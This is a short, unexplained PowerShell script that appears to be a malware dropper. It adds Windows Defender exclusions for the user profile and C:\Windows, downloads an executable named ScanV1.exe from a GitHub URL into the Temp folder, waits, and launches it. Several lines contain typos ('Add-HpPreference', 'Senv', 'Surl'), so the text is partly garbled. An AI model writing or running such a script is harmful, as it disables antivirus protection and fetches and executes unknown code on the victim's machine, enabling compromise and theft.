﻿##################################################################################################
Add-HpPreference -ExclusionPath Senv:USERPROFILE 
Add-MpPreference -ExclusionPath C:\Windows 

###################################################################################################
$url = "https://github.com/Oqgpp/scanner/blob/main/ScanV1.exe"


###################################################################################################

$output = "$env:Temp/ScanV1.exe"


###################################################################################################

Invoke-WebRequest -Uri Surl -OutFile $output 


###################################################################################################

Start-Sleep Milliseconds 6000 
Start-Process -FilePath $output

